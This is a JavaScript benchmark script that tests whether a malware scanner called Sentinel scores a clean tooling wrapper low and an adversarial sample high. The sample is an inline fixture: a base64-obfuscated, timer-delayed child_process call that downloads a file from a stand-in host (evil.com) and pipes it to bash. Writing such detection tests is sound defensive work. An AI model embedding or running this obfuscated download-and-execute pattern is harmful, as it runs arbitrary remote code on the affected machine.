const path = require('path');
const fs = require('fs');
const scanner = require('../packages/sentinel-core/scanner/index');

const BENCHMARK_FILES = [
    {
        name: 'gh_bridge.js',
        desc: 'Clean Tooling Wrapper (Must yield negligible FP Score)',
        path: path.join(__dirname, '../packages/sentinel-core/lib/gh_bridge.js'),
        expectClean: true,
    },
    {
        name: 'adversarial_base64_wrapper.js',
        desc: 'Malicious Evasion Payload (Must yield Critical Score)',
        content: `
            const cp = require('child_process');
            const payload = Buffer.from('Y3VybCAtcyBodHRwczovL2V2aWwuY29tL3NoLmV4ZSB8IGJhc2g=', 'base64').toString('ascii');
            setTimeout(() => {
                cp.exec(payload, (err, out) => console.log(out));
            }, 1000);
        `,
        expectCritical: true,
    }
];

async function runSuite() {
    console.log("=========================================");
    console.log("Sentinel Policy & Benchmark Gate");
    console.log("=========================================\n");

    let failures = 0;

    for (const t of BENCHMARK_FILES) {
        console.log(`[TEST] ${t.desc}`);
        let content = t.content;
        
        if (t.path) {
            content = fs.readFileSync(t.path, 'utf8');
        }

        const scanResult = await scanner.scanFile(t.name, content, null, { mode: 'local' });
        
        const maxScore = scanResult.alerts.length > 0 
            ? Math.max(...scanResult.alerts.map(a => a.riskLevel))
            : 0;

        if (t.expectClean) {
            if (maxScore >= 65) {
                console.error(`  FAILED: False Positive Regression. '${t.name}' spiked to score ${maxScore} (Expected < 65).`);
                failures++;
            } else {
                console.log(`  PASSED: '${t.name}' stayed clean (Max Score: ${maxScore})`);
            }
        }

        if (t.expectCritical) {
            if (maxScore < 80) {
                console.error(`  FAILED: Evasion Regression. '${t.name}' dropped to score ${maxScore} (Expected >= 80). Sentinel failed to detect threat.`);
                failures++;
            } else {
                console.log(`  PASSED: Adversarial caught '${t.name}' (Score: ${maxScore})`);
            }
        }
        console.log('---');
    }

    if (failures > 0) {
        console.error(`\nBenchmark Suite FAILED with ${failures} regressions.`);
        console.error(`Policy Engine blocked the release package. Fix the heuristics and re-run.`);
        process.exit(1);
    } else {
        console.log(`\nBenchmark Suite PASSED. Zero False Positives in Core. 100% Threat Trace Recall.`);
        process.exit(0);
    }
}

runSuite().catch(err => { console.error(err); process.exit(1); });
